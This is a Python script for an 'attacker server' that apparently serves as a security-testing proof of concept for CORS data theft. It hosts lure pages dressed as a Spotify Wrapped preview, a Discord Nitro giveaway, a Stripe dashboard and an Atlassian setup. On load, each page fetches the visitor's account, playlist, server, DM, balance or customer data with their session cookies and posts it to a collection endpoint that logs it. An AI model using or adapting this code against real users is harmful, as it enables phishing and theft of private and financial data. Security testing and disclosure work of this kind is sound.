#!/usr/bin/env python3
"""
BEATRIX PoC Attacker Server

This server demonstrates CORS data exfiltration by:
1. Serving malicious HTML pages that make cross-origin requests
2. Collecting any data that gets exfiltrated
3. Logging everything for PoC evidence

Usage: python attacker_server.py [port]
Default port: 8888
"""

import http.server
import json
import socketserver
import sys
from datetime import datetime
from urllib.parse import parse_qs, urlparse

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8888
LOG_FILE = "exfiltrated_data.log"

# Store exfiltrated data
exfiltrated_data = []

class AttackerHandler(http.server.SimpleHTTPRequestHandler):
    """Handle requests to the attacker server"""

    def do_GET(self):
        """Serve PoC pages or handle data collection"""
        parsed = urlparse(self.path)

        if parsed.path == "/":
            self.serve_index()
        elif parsed.path == "/poc/cors":
            self.serve_cors_poc()
        elif parsed.path == "/poc/spotify":
            self.serve_spotify_poc()
        elif parsed.path == "/poc/discord":
            self.serve_discord_poc()
        elif parsed.path == "/poc/stripe":
            self.serve_stripe_poc()
        elif parsed.path == "/poc/atlassian":
            self.serve_atlassian_poc()
        elif parsed.path == "/collect":
            # GET-based collection (for simple exfil)
            self.collect_data(parse_qs(parsed.query))
        elif parsed.path == "/log":
            self.serve_log()
        else:
            super().do_GET()

    def do_POST(self):
        """Handle POST data collection"""
        if self.path.startswith("/collect"):
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            self.collect_data(post_data, method="POST")
        else:
            self.send_error(404)

    def do_OPTIONS(self):
        """Handle CORS preflight"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def collect_data(self, data, method="GET"):
        """Log exfiltrated data"""
        timestamp = datetime.now().isoformat()
        entry = {
            "timestamp": timestamp,
            "method": method,
            "source_ip": self.client_address[0],
            "data": data
        }
        exfiltrated_data.append(entry)

        # Log to file
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(entry, indent=2) + "\n---\n")

        print(f"\n🔴 DATA EXFILTRATED at {timestamp}:")
        print(json.dumps(data if isinstance(data, dict) else {"raw": data[:500]}, indent=2))

        # Send success response
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({"status": "collected"}).encode())

    def serve_html(self, content, title="PoC"):
        """Serve HTML content"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(content.encode())

    def serve_index(self):
        """Serve index page listing all PoCs"""
        html = """<!DOCTYPE html>
<html>
<head>
    <title>BEATRIX Attack Server</title>
    <style>
        body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 40px; }
        h1 { color: #ff0; }
        a { color: #0ff; }
        .poc-list { list-style: none; padding: 0; }
        .poc-list li { margin: 10px 0; padding: 10px; background: #16213e; border-left: 3px solid #0f0; }
        .warning { color: #f00; background: #300; padding: 10px; margin: 20px 0; }
    </style>
</head>
<body>
    <h1>🐰 BEATRIX Attack Server</h1>
    <p>For authorized security testing only.</p>

    <div class="warning">
        ⚠️ This server collects data for PoC demonstration. Only use on your own accounts.
    </div>

    <h2>Available PoCs:</h2>
    <ul class="poc-list">
        <li><a href="/poc/spotify">Spotify CORS PoC</a> - Steals user profile, playlists</li>
        <li><a href="/poc/discord">Discord CORS PoC</a> - Steals user data, servers, DMs</li>
        <li><a href="/poc/stripe">Stripe CORS PoC</a> - Steals merchant data, balance</li>
        <li><a href="/poc/atlassian">Atlassian CORS PoC</a> - Steals Jira/Confluence data</li>
    </ul>

    <h2>Exfiltration Log:</h2>
    <p><a href="/log">View collected data</a></p>

    <h2>How to use:</h2>
    <ol>
        <li>Log into the target service in your browser</li>
        <li>Click the PoC link above</li>
        <li>Watch the data appear in the terminal/log</li>
        <li>Screenshot everything for your report</li>
    </ol>
</body>
</html>"""
        self.serve_html(html)

    def serve_log(self):
        """Serve the exfiltration log"""
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Exfiltration Log</title>
    <style>
        body {{ font-family: monospace; background: #1a1a2e; color: #0f0; padding: 40px; }}
        pre {{ background: #0a0a1a; padding: 20px; overflow-x: auto; }}
    </style>
    <meta http-equiv="refresh" content="5">
</head>
<body>
    <h1>📋 Exfiltration Log</h1>
    <p>Auto-refreshes every 5 seconds</p>
    <pre>{json.dumps(exfiltrated_data, indent=2)}</pre>
</body>
</html>"""
        self.serve_html(html)

    def serve_spotify_poc(self):
        """Spotify CORS PoC"""
        server_url = f"http://localhost:{PORT}"
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>🎵 Spotify Wrapped 2025 - Early Access</title>
    <style>
        body {{ font-family: 'Circular', Arial, sans-serif; background: #121212; color: #fff; padding: 40px; text-align: center; }}
        h1 {{ color: #1DB954; }}
        .loading {{ color: #b3b3b3; }}
        #results {{ text-align: left; background: #282828; padding: 20px; margin: 20px auto; max-width: 600px; border-radius: 8px; }}
    </style>
</head>
<body>
    <h1>🎵 Spotify Wrapped 2025</h1>
    <p>Early access preview - Loading your data...</p>
    <div id="status" class="loading">Connecting to Spotify...</div>
    <div id="results"></div>

    <script>
    const SERVER = "{server_url}";
    const results = document.getElementById('results');
    const status = document.getElementById('status');

    async function exploit() {{
        const endpoints = [
            'https://api.spotify.com/v1/me',
            'https://api.spotify.com/v1/me/playlists?limit=5',
            'https://api.spotify.com/v1/me/top/artists?limit=5'
        ];

        let stolen = {{}};

        for (const url of endpoints) {{
            try {{
                status.textContent = 'Fetching: ' + url;
                const resp = await fetch(url, {{ credentials: 'include' }});
                const data = await resp.json();
                stolen[url] = data;

                // Display for PoC
                results.innerHTML += '<h3>' + url + '</h3><pre>' + JSON.stringify(data, null, 2).slice(0, 500) + '</pre>';
            }} catch (e) {{
                stolen[url] = {{ error: e.message }};
                results.innerHTML += '<p style="color:red">Error on ' + url + ': ' + e.message + '</p>';
            }}
        }}

        // Exfiltrate
        status.textContent = 'Sending to attacker server...';
        await fetch(SERVER + '/collect', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                target: 'spotify',
                timestamp: new Date().toISOString(),
                data: stolen
            }})
        }});

        status.textContent = '✅ Data exfiltrated! Check server log.';
    }}

    exploit();
    </script>
</body>
</html>"""
        self.serve_html(html)

    def serve_discord_poc(self):
        """Discord CORS PoC"""
        server_url = f"http://localhost:{PORT}"
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>🎮 Discord Nitro Giveaway</title>
    <style>
        body {{ font-family: 'gg sans', Arial, sans-serif; background: #313338; color: #f2f3f5; padding: 40px; text-align: center; }}
        h1 {{ color: #5865F2; }}
        #results {{ text-align: left; background: #2b2d31; padding: 20px; margin: 20px auto; max-width: 700px; border-radius: 8px; }}
        pre {{ font-size: 12px; overflow-x: auto; }}
    </style>
</head>
<body>
    <h1>🎮 FREE Discord Nitro!</h1>
    <p>Verifying your account eligibility...</p>
    <div id="status">Connecting...</div>
    <div id="results"></div>

    <script>
    const SERVER = "{server_url}";
    const results = document.getElementById('results');
    const status = document.getElementById('status');

    async function exploit() {{
        const endpoints = [
            'https://discord.com/api/v9/users/@me',
            'https://discord.com/api/v9/users/@me/guilds',
            'https://discord.com/api/v9/users/@me/channels',
            'https://discord.com/api/v9/users/@me/connections'
        ];

        let stolen = {{}};

        for (const url of endpoints) {{
            try {{
                status.textContent = 'Checking: ' + url.split('/').pop();
                const resp = await fetch(url, {{ credentials: 'include' }});
                const data = await resp.json();
                stolen[url] = data;

                results.innerHTML += '<h4>' + url.split('v9')[1] + '</h4><pre>' +
                    JSON.stringify(data, null, 2).slice(0, 400) + '...</pre>';
            }} catch (e) {{
                stolen[url] = {{ error: e.message }};
            }}
        }}

        // Exfiltrate
        await fetch(SERVER + '/collect', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                target: 'discord',
                timestamp: new Date().toISOString(),
                data: stolen
            }})
        }});

        status.textContent = '✅ Verification complete! Data captured.';
    }}

    exploit();
    </script>
</body>
</html>"""
        self.serve_html(html)

    def serve_stripe_poc(self):
        """Stripe CORS PoC"""
        server_url = f"http://localhost:{PORT}"
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>💳 Stripe Analytics Dashboard</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f6f9fc; color: #32325d; padding: 40px; }}
        h1 {{ color: #6772e5; }}
        #results {{ background: #fff; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        pre {{ background: #f6f9fc; padding: 10px; font-size: 11px; overflow-x: auto; }}
        .error {{ color: #e25950; }}
    </style>
</head>
<body>
    <h1>💳 Stripe Revenue Analytics</h1>
    <p>Loading your merchant dashboard...</p>
    <div id="status">Connecting to Stripe API...</div>
    <div id="results"></div>

    <script>
    const SERVER = "{server_url}";
    const results = document.getElementById('results');
    const status = document.getElementById('status');

    async function exploit() {{
        // Stripe uses API keys, not cookies for auth
        // This tests if dashboard.stripe.com session cookies work
        const endpoints = [
            'https://api.stripe.com/v1/account',
            'https://api.stripe.com/v1/balance',
            'https://api.stripe.com/v1/customers?limit=3',
            'https://api.stripe.com/v1/charges?limit=3'
        ];

        let stolen = {{}};
        let success = false;

        for (const url of endpoints) {{
            try {{
                status.textContent = 'Fetching: ' + url.split('v1/')[1];
                const resp = await fetch(url, {{ credentials: 'include' }});
                const data = await resp.json();
                stolen[url] = data;

                if (!data.error) success = true;

                results.innerHTML += '<h4>' + url.split('v1/')[1] + '</h4><pre>' +
                    JSON.stringify(data, null, 2).slice(0, 500) + '</pre>';
            }} catch (e) {{
                stolen[url] = {{ error: e.message }};
                results.innerHTML += '<p class="error">Error: ' + e.message + '</p>';
            }}
        }}

        // Exfiltrate
        await fetch(SERVER + '/collect', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                target: 'stripe',
                timestamp: new Date().toISOString(),
                authenticated: success,
                data: stolen
            }})
        }});

        status.textContent = success ? '✅ Merchant data captured!' : '⚠️ API returned errors (may need auth)';
    }}

    exploit();
    </script>
</body>
</html>"""
        self.serve_html(html)

    def serve_atlassian_poc(self):
        """Atlassian CORS PoC"""
        server_url = f"http://localhost:{PORT}"
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>🔷 Atlassian Integration Setup</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #fff; color: #172b4d; padding: 40px; }}
        h1 {{ color: #0052CC; }}
        #results {{ background: #f4f5f7; padding: 20px; margin: 20px 0; border-radius: 4px; }}
        pre {{ font-size: 11px; overflow-x: auto; }}
    </style>
</head>
<body>
    <h1>🔷 Connect Your Atlassian Account</h1>
    <p>Authorizing integration access...</p>
    <div id="status">Connecting to Atlassian...</div>
    <div id="results"></div>

    <script>
    const SERVER = "{server_url}";
    const results = document.getElementById('results');
    const status = document.getElementById('status');

    async function exploit() {{
        const endpoints = [
            'https://api.atlassian.com/me',
            'https://api.atlassian.com/oauth/token/accessible-resources'
        ];

        let stolen = {{}};

        for (const url of endpoints) {{
            try {{
                status.textContent = 'Checking: ' + url.split('.com')[1];
                const resp = await fetch(url, {{ credentials: 'include' }});
                const data = await resp.json();
                stolen[url] = data;

                results.innerHTML += '<h4>' + url.split('.com')[1] + '</h4><pre>' +
                    JSON.stringify(data, null, 2) + '</pre>';
            }} catch (e) {{
                stolen[url] = {{ error: e.message }};
            }}
        }}

        // Exfiltrate
        await fetch(SERVER + '/collect', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                target: 'atlassian',
                timestamp: new Date().toISOString(),
                data: stolen
            }})
        }});

        status.textContent = '✅ Account data captured!';
    }}

    exploit();
    </script>
</body>
</html>"""
        self.serve_html(html)

    def log_message(self, format, *args):
        """Custom logging"""
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {args[0]}")


def main():
    with socketserver.TCPServer(("", PORT), AttackerHandler) as httpd:
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║           🐰 BEATRIX ATTACKER SERVER RUNNING 🐰              ║
╠══════════════════════════════════════════════════════════════╣
║  URL: http://localhost:{PORT:<5}                                ║
║  Log: {LOG_FILE:<30}               ║
╠══════════════════════════════════════════════════════════════╣
║  PoCs available at:                                          ║
║    • http://localhost:{PORT}/poc/spotify                       ║
║    • http://localhost:{PORT}/poc/discord                       ║
║    • http://localhost:{PORT}/poc/stripe                        ║
║    • http://localhost:{PORT}/poc/atlassian                     ║
╠══════════════════════════════════════════════════════════════╣
║  Press Ctrl+C to stop                                        ║
╚══════════════════════════════════════════════════════════════╝
""")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n🛑 Server stopped")
            print(f"📋 Exfiltrated data saved to: {LOG_FILE}")


if __name__ == "__main__":
    main()
